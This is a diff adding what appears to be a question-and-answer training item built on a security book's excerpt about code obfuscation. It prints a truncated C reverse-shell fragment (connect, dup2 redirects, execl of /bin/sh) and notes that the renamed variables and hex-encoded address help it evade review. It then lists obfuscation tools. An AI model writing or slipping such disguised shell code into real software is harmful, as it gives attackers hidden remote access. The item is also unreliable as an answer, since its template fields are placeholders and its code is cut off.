@@ -1,0 +1,28 @@
+TECHNIQUE / QUESTION:
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+connect(x1x2x3, (struct sockaddr *)&y1y2y3, sizeof
+dup2(x1x2x3, 0); // Redirect standard input
+dup2(x1x2x3, 1); // Redirect standard output
+dup2(x1x2x3, 2); // Redirect standard error
+execl("/bin/sh", "sh", NULL); // Execute shell
+}
+int d1d2d3() {
+a1b2c3();
+return 0;
+}
+In Example 6-16 the function and variable names have been changed to
+meaningless sequences (a1b2c3, x1x2x3, y1y2y3, d1d2d3). The IP address
+and port number are encoded in hexadecimal format to hide their true
+values. The code maintains consistent formatting to avoid raising suspicion
+during superficial reviews.
+Several popular tools can be used for code obfuscation:
+• ProGuard: Tool used for Java applications, primarily Android apps
+• PyArmor: Tool used for Python scripts
+• obfuscator.io: Online tool used for obfuscating JavaScript code
